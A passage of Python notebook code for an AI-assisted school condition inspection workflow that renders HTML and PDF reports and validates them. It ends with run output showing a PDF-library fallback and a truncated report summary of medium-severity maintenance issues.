      <h1>{{ content.title }}</h1>
      <p class="cover-subtitle">A cautious visual inspection summary generated from category-level evidence packets and deterministic validation checks.</p>
      <div class="cover-meta">
        <p>Overall status: <strong>{{ content.overall_status }}</strong></p>
        <p>Provisional: <strong>{{ "Yes" if content.provisional else "No" }}</strong></p>
        <p>Generated at: {{ metadata.generated_at_utc }}</p>
      </div>
    </div>
    {% if cover_image_url %}
    <div class="cover-image">
      <img src="{{ cover_image_url }}" alt="School inspection report workflow visual">
    </div>
    {% endif %}
  </div>
  <div class="cover-footer">{{ content.disclaimer }}</div>
</section>

<main class="report-shell">
<h1>{{ content.title }}</h1>
<p class="meta">Generated at: {{ metadata.generated_at_utc }}</p>
<h2>Overall Verdict</h2>
<div class="summary-card">
  <p><span class="badge {{ status_class }}">{{ content.overall_status }}</span></p>
  <ul><li>Provisional: {{ "Yes" if content.provisional else "No" }}</li><li>Deterministic status floor: {{ metadata.deterministic_status_floor }}</li></ul>
</div>
<h2>Executive Summary</h2>
<ul>{% for item in content.executive_summary %}<li>{{ item }}</li>{% endfor %}</ul>
<h2>Scope and Inspected Categories</h2>
<ul>{% for item in content.scope_and_inputs %}<li>{{ item }}</li>{% endfor %}</ul>
<h2>Input Provenance</h2>
<ul>{% for item in metadata.category_output_sources %}<li><code>{{ item.category }}</code>: <code>{{ item.path }}</code> ({{ item.last_modified_utc }})</li>{% endfor %}</ul>
<h2>Category Summary Table</h2>
<table><thead><tr><th>Category</th><th>Status</th><th>Images</th><th>High</th><th>Medium</th><th>Low</th><th>Human Review</th></tr></thead><tbody>
{% for row in category_table %}
<tr><td><code>{{ row.category }}</code></td><td>{{ row.status }}</td><td>{{ row.image_count }}</td><td>{{ row.high }}</td><td>{{ row.medium }}</td><td>{{ row.low }}</td><td>{{ row.human_review }}</td></tr>
{% endfor %}
</tbody></table>
<div class="action-grid">
  <section class="action-box"><h2>Immediate Actions</h2><ul>{% for item in content.immediate_actions %}<li>{{ item }}</li>{% else %}<li>None recorded.</li>{% endfor %}</ul></section>
  <section class="action-box"><h2>Maintenance Actions</h2><ul>{% for item in content.maintenance_actions %}<li>{{ item }}</li>{% else %}<li>None recorded.</li>{% endfor %}</ul></section>
</div>
<div class="action-grid">
  <section class="action-box"><h2>Documentation Follow-ups</h2><ul>{% for item in content.documentation_followups %}<li>{{ item }}</li>{% else %}<li>None recorded.</li>{% endfor %}</ul></section>
  <section class="action-box"><h2>Human Review Notes</h2><ul>{% for item in content.human_review_notes %}<li>{{ item }}</li>{% else %}<li>None recorded.</li>{% endfor %}</ul></section>
</div>
<h2>Category-by-Category Findings</h2>
{% for section in content.category_sections %}
<section class="category-block">
<h3>{{ section.category }}</h3>
<ul><li>Status: {{ section.status }}</li><li>Priority: {{ section.priority }}</li></ul>
<p>{{ section.summary }}</p>
<p><strong>Evidence references</strong></p>
<ul>{% for item in section.evidence_refs %}<li>{{ item }}</li>{% else %}<li>None recorded.</li>{% endfor %}</ul>
<p><strong>Recommended actions</strong></p>
<ul>{% for item in section.recommended_actions %}<li>{{ item }}</li>{% else %}<li>None recorded.</li>{% endfor %}</ul>
</section>
{% endfor %}
<h2>Limitations and Disclaimer</h2>
<ul>{% for item in content.limitations %}<li>{{ item }}</li>{% endfor %}</ul>
<p class="disclaimer">{{ content.disclaimer }}</p>
<h2>Machine-Readable Appendix</h2>
<pre>{{ appendix_json }}</pre>
</main>
</body>
</html>
""".strip()


def render_report_html(content: FinalReportContent, metadata: dict, category_packets: list[dict]) -> str:
    """Render the final report as deterministic HTML for PDF conversion."""

    packet_by_category = {packet["category"]: packet for packet in category_packets}
    category_table = []
    for section in content.category_sections:
        packet = packet_by_category[section.category]
        counts = packet["issue_counts"]
        category_table.append(
            {
                "category": section.category,
                "status": status_label(section.status),
                "image_count": packet["image_count"],
                "high": counts.get("high", 0),
                "medium": counts.get("medium", 0),
                "low": counts.get("low", 0),
                "human_review": "Yes" if packet["human_review_required"] else "No",
            }
        )

    status_class = {
        "urgent_review_required": "urgent",
        "maintenance_attention_required": "medium",
        "insufficient_evidence": "status-insufficient",
        "acceptable_with_minor_issues": "status-ok",
    }[content.overall_status]

    appendix = {
        "final_aggregation_json_path": metadata["final_aggregation_json_path"],
        "report_content_json_path": metadata["report_content_json_path"],
        "models": metadata["models"],
        "processed_categories": metadata["processed_categories"],
        "not_inspected_categories": metadata["not_inspected_categories"],
        "total_images": metadata["total_images"],
        "deterministic_status_floor": metadata["deterministic_status_floor"],
    }

    environment = Environment(loader=BaseLoader(), autoescape=select_autoescape(default=True))
    template = environment.from_string(REPORT_HTML_TEMPLATE)
    return template.render(
        content=content.model_dump(mode="json"),
        metadata=metadata,
        category_table=category_table,
        status_class=status_class,
        cover_image_url=image_path_to_data_url(REPORT_COVER_IMAGE_PATH),
        appendix_json=json.dumps(appendix, indent=2, ensure_ascii=False),
    )


def reportlab_bullet_list(items: list[str], styles: dict) -> list:
    """Convert text items into ReportLab bullet paragraphs."""

    from reportlab.platypus import Paragraph

    cleaned_items = [item.strip() for item in items if item and item.strip()]
    if not cleaned_items:
        cleaned_items = ["None recorded."]
    return [Paragraph(f"- {item}", styles["BodyText"]) for item in cleaned_items]


def render_report_pdf_with_reportlab(
    content: FinalReportContent,
    metadata: dict,
    category_packets: list[dict],
    pdf_path: Path,
) -> None:
    """Render a deterministic PDF with ReportLab when WeasyPrint is unavailable."""

    from reportlab.lib import colors
    from reportlab.lib.pagesizes import A4
    from reportlab.lib.styles import ParagraphStyle, getSampleStyleSheet
    from reportlab.lib.units import mm
    from reportlab.platypus import Image, PageBreak, Paragraph, SimpleDocTemplate, Spacer, Table, TableStyle

    styles = getSampleStyleSheet()
    styles.add(
        ParagraphStyle(
            name="CoverTitle",
            parent=styles["Title"],
            textColor=colors.HexColor("#ffffff"),
            fontSize=28,
            leading=32,
            spaceAfter=10,
        )
    )
    styles.add(
        ParagraphStyle(
            name="CoverText",
            parent=styles["BodyText"],
            textColor=colors.HexColor("#d8e7f7"),
            fontSize=11,
            leading=15,
        )
    )
    styles["Heading2"].textColor = colors.HexColor("#12385b")
    styles["Heading3"].textColor = colors.HexColor("#23435f")

    story = [
        Table(
            [[
                Paragraph("AI-assisted school condition validator", styles["CoverText"]),
                Paragraph(content.overall_status, styles["CoverText"]),
            ]],
            colWidths=[120 * mm, 50 * mm],
            style=[
                ("BACKGROUND", (0, 0), (-1, -1), colors.HexColor("#071f3d")),
                ("BOX", (0, 0), (-1, -1), 0, colors.HexColor("#071f3d")),
                ("LEFTPADDING", (0, 0), (-1, -1), 8),
                ("RIGHTPADDING", (0, 0), (-1, -1), 8),
                ("TOPPADDING", (0, 0), (-1, -1), 8),
                ("BOTTOMPADDING", (0, 0), (-1, -1), 8),
            ],
        ),
        Spacer(1, 10 * mm),
        Paragraph(content.title, styles["Title"]),
        Paragraph(
            "A cautious visual inspection summary generated from category-level evidence packets and deterministic validation checks.",
            styles["BodyText"],
        ),
        Spacer(1, 6 * mm),
    ]
    if REPORT_COVER_IMAGE_PATH and REPORT_COVER_IMAGE_PATH.exists():
        from PIL import Image as PILImage

        image_width_px, image_height_px = PILImage.open(REPORT_COVER_IMAGE_PATH).size
        cover_width = 170 * mm
        cover_height = cover_width * image_height_px / image_width_px
        cover_image = Image(str(REPORT_COVER_IMAGE_PATH), width=cover_width, height=cover_height)
        cover_image.hAlign = "CENTER"
        story.extend([cover_image, Spacer(1, 7 * mm)])
    story.extend(
        [
            Paragraph(f"Generated at: {metadata['generated_at_utc']}", styles["BodyText"]),
            Paragraph(f"Provisional: {'Yes' if content.provisional else 'No'}", styles["BodyText"]),
            Paragraph(content.disclaimer, styles["BodyText"]),
            PageBreak(),
        ]
    )

    story.extend(
        [
            Paragraph(f"Generated at: {metadata['generated_at_utc']}", styles["Normal"]),
            Paragraph("Overall Verdict", styles["Heading2"]),
            Paragraph(f"Overall status: {content.overall_status}", styles["BodyText"]),
            Paragraph(f"Provisional: {'Yes' if content.provisional else 'No'}", styles["BodyText"]),
            Paragraph(f"Deterministic status floor: {metadata['deterministic_status_floor']}", styles["BodyText"]),
            Paragraph("Executive Summary", styles["Heading2"]),
            *reportlab_bullet_list(content.executive_summary, styles),
            Paragraph("Scope and Inspected Categories", styles["Heading2"]),
            *reportlab_bullet_list(content.scope_and_inputs, styles),
            Paragraph("Input Provenance", styles["Heading2"]),
            *reportlab_bullet_list(
                [
                    f"{item['category']}: {item['path']} ({item['last_modified_utc']})"
                    for item in metadata["category_output_sources"]
                ],
                styles,
            ),
        ]
    )

    packet_by_category = {packet["category"]: packet for packet in category_packets}
    table_rows = [["Category", "Status", "Images", "High", "Medium", "Low", "Human Review"]]
    for section in content.category_sections:
        packet = packet_by_category[section.category]
        counts = packet["issue_counts"]
        table_rows.append(
            [
                section.category,
                status_label(section.status),
                str(packet["image_count"]),
                str(counts.get("high", 0)),
                str(counts.get("medium", 0)),
                str(counts.get("low", 0)),
                "Yes" if packet["human_review_required"] else "No",
            ]
        )

    story.append(Paragraph("Category Summary Table", styles["Heading2"]))
    table = Table(table_rows, repeatRows=1)
    table.setStyle(
        TableStyle(
            [
                ("BACKGROUND", (0, 0), (-1, 0), colors.HexColor("#f2f4f7")),
                ("GRID", (0, 0), (-1, -1), 0.5, colors.HexColor("#d0d5dd")),
                ("FONTNAME", (0, 0), (-1, 0), "Helvetica-Bold"),
                ("VALIGN", (0, 0), (-1, -1), "TOP"),
            ]
        )
    )
    story.extend([table, Spacer(1, 4 * mm)])

    for heading, items in [
        ("Immediate Actions", content.immediate_actions),
        ("Maintenance Actions", content.maintenance_actions),
        ("Documentation Follow-ups", content.documentation_followups),
        ("Human Review Notes", content.human_review_notes),
    ]:
        story.append(Paragraph(heading, styles["Heading2"]))
        story.extend(reportlab_bullet_list(items, styles))

    story.append(Paragraph("Category-by-Category Findings", styles["Heading2"]))
    for section in content.category_sections:
        story.extend(
            [
                Paragraph(section.category, styles["Heading3"]),
                Paragraph(f"Status: {section.status}", styles["BodyText"]),
                Paragraph(f"Priority: {section.priority}", styles["BodyText"]),
                Paragraph(section.summary, styles["BodyText"]),
                Paragraph("Evidence references", styles["Heading4"]),
                *reportlab_bullet_list(section.evidence_refs, styles),
                Paragraph("Recommended actions", styles["Heading4"]),
                *reportlab_bullet_list(section.recommended_actions, styles),
            ]
        )

    story.append(Paragraph("Limitations and Disclaimer", styles["Heading2"]))
    story.extend(reportlab_bullet_list(content.limitations, styles))
    story.append(Paragraph(content.disclaimer, styles["BodyText"]))

    appendix = {
        "final_aggregation_json_path": metadata["final_aggregation_json_path"],
        "report_content_json_path": metadata["report_content_json_path"],
        "models": metadata["models"],
        "processed_categories": metadata["processed_categories"],
        "not_inspected_categories": metadata["not_inspected_categories"],
        "total_images": metadata["total_images"],
        "deterministic_status_floor": metadata["deterministic_status_floor"],
    }
    story.append(Paragraph("Machine-Readable Appendix", styles["Heading2"]))
    story.append(Paragraph(json.dumps(appendix, indent=2, ensure_ascii=False).replace("\n", "<br />"), styles["Code"]))

    document = SimpleDocTemplate(
        str(pdf_path),
        pagesize=A4,
        rightMargin=20 * mm,
        leftMargin=20 * mm,
        topMargin=22 * mm,
        bottomMargin=22 * mm,
    )
    document.build(story)


def render_report_pdf(
    html_text: str,
    pdf_path: Path,
    content: FinalReportContent,
    metadata: dict,
    category_packets: list[dict],
) -> str:
    """Render HTML into PDF with WeasyPrint, falling back to ReportLab if needed."""

    try:
        import contextlib
        import io

        with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
            from weasyprint import HTML

        HTML(string=html_text, base_url=str(Path.cwd())).write_pdf(pdf_path)
        return "weasyprint"
    except Exception as error:
        print(f"WeasyPrint PDF rendering failed; using ReportLab fallback. Reason: {error}")
        render_report_pdf_with_reportlab(content, metadata, category_packets, pdf_path)
        return "reportlab"


def validate_rendered_report(
    content: FinalReportContent,
    paths: dict[str, Path],
    category_packets: list[dict],
    global_rollup: dict,
) -> None:
    """Validate saved Markdown, HTML, JSON, and PDF artifacts before accepting the report."""

    for label in ["markdown_report", "html_report", "report_content_json", "report_generation_payload"]:
        path = paths[label]
        if not path.exists() or path.stat().st_size == 0:
            raise ValueError(f"Rendered report artifact is missing or empty: {label} -> {path}")

    pdf_path = paths["pdf_report"]
    if not pdf_path.exists() or pdf_path.stat().st_size == 0:
        raise ValueError(f"Rendered PDF report is missing or empty: {pdf_path}")

    saved_content = json.loads(paths["report_content_json"].read_text(encoding="utf-8"))
    if saved_content != content.model_dump(mode="json"):
        raise ValueError("Saved report content JSON does not match validated FinalReportContent.")

    reader = PdfReader(str(pdf_path))
    if len(reader.pages) < 1:
        raise ValueError("Rendered PDF has no pages.")

    def normalize_pdf_text(value: str) -> str:
        return " ".join(value.lower().split())

    pdf_text = "\n".join(page.extract_text() or "" for page in reader.pages)
    pdf_text_normalized = normalize_pdf_text(pdf_text)
    required_terms = [content.overall_status, REPORT_DISCLAIMER]
    required_terms.extend(packet["category"] for packet in category_packets)
    required_terms.extend(global_rollup.get("not_inspected_categories", []))

    for term in required_terms:
        if term and normalize_pdf_text(term) not in pdf_text_normalized:
            raise ValueError(f"Rendered PDF is missing required text: {term}")

    if content.provisional and not (
        "provisional" in pdf_text_normalized or "human review" in pdf_text_normalized
    ):
        raise ValueError("Rendered PDF does not mention provisional or human review status.")


def save_final_report_outputs(
    content: FinalReportContent,
    payload: dict,
    metadata: dict,
    category_packets: list[dict],
    global_rollup: dict,
) -> dict[str, Path]:
    """Save final Markdown, HTML, PDF, JSON, and payload artifacts."""

    paths = {
        "markdown_report": FINAL_REPORT_OUTPUT_ROOT / "school_safety_final_report.md",
        "html_report": FINAL_REPORT_OUTPUT_ROOT / "school_safety_final_report.html",
        "pdf_report": FINAL_REPORT_OUTPUT_ROOT / "school_safety_final_report.pdf",
        "report_content_json": FINAL_REPORT_OUTPUT_ROOT / "school_safety_final_report_content.json",
        "report_generation_payload": FINAL_REPORT_OUTPUT_ROOT / "report_generation_payload.json",
    }

    markdown_text = render_report_markdown(content, metadata, category_packets)
    html_text = render_report_html(content, metadata, category_packets)

    paths["markdown_report"].write_text(markdown_text, encoding="utf-8")
    paths["html_report"].write_text(html_text, encoding="utf-8")
    paths["report_content_json"].write_text(content.model_dump_json(indent=2), encoding="utf-8")
    paths["report_generation_payload"].write_text(json.dumps(payload, indent=2, ensure_ascii=False), encoding="utf-8")
    pdf_renderer = render_report_pdf(html_text, paths["pdf_report"], content, metadata, category_packets)
    metadata["pdf_renderer"] = pdf_renderer

    validate_rendered_report(content, paths, category_packets, global_rollup)
    return paths


REPORT_GENERATION_SYSTEM_PROMPT = f"""
You are a careful content writer for a school inspection workflow.
Create structured report content only. Do not create Markdown, HTML, or layout.
Keep the verdict cautious and evidence-bound. Do not add unsupported claims.
Use exactly one category section for each processed category and no other categories.
Use this exact disclaimer: {REPORT_DISCLAIMER}
Return structured JSON that matches the requested schema exactly.
""".strip()

report_metadata = build_report_metadata(category_output_sources, global_rollup)
report_generation_payload = build_report_generation_payload(
    final_llm_report,
    category_packets,
    global_rollup,
    category_output_sources,
)

report_generation_response = parse_openai_structured_response(
    model=FINAL_REPORT_MODEL,
    input=[
        {
            "role": "system",
            "content": [
                {"type": "input_text", "text": REPORT_GENERATION_SYSTEM_PROMPT},
            ],
        },
        {
            "role": "user",
            "content": [
                {
                    "type": "input_text",
                    "text": json.dumps(report_generation_payload, indent=2, ensure_ascii=False),
                },
            ],
        },
    ],
    text_format=FinalReportContent,
)

raw_final_report_content = report_generation_response.output_parsed
final_report_content = validate_final_report_content(
    raw_final_report_content,
    final_llm_report,
    category_packets,
    global_rollup,
)
final_report_files = save_final_report_outputs(
    final_report_content,
    report_generation_payload,
    report_metadata,
    category_packets,
    global_rollup,
)

print("Final report model:", FINAL_REPORT_MODEL)
print("Saved final report files:")
for label, path in final_report_files.items():
    print(f"- {label}: {path}")

final_report_content.model_dump(mode="json")


WeasyPrint PDF rendering failed; using ReportLab fallback. Reason: cannot load library 'libgobject-2.0-0': error 0x7e.  Additionally, ctypes.util.find_library() did not manage to locate a library called 'libgobject-2.0-0'
Final report model: gpt-4.1-mini
Saved final report files:
- markdown_report: school_validation_outputs\final_reports\school_safety_final_report.md
- html_report: school_validation_outputs\final_reports\school_safety_final_report.html
- pdf_report: school_validation_outputs\final_reports\school_safety_final_report.pdf
- report_content_json: school_validation_outputs\final_reports\school_safety_final_report_content.json
- report_generation_payload: school_validation_outputs\final_reports\report_generation_payload.json


{'title': 'School Inspection Visual Assessment Summary',
 'overall_status': 'insufficient_evidence',
 'provisional': True,
 'executive_summary': ['The majority of inspected categories require attention due to medium severity issues such as water stains, cracks, corrosion, damage, and obstructions.',
  'No high severity or urgent issues were found, but multiple medium-level maintenance concerns exist across most categories, especially fire extinguishers which also require human review.',
  'Minor maintenance is noted in the classroom category.',
  'Limitations include the absence of inspection data for the "other" category.'],
 'scope_and_inputs': ['Visual inspection of eight configured categories: ceiling, classroom, corridor, electrical, exterior, fire_extinguisher, staircase, washroom.',
  'Inspection did not include the "other" category, which remains unassessed.',
  'Evidence based on image assessments and officer comments where provided.'],
 'category_sections': [{'category': 'cei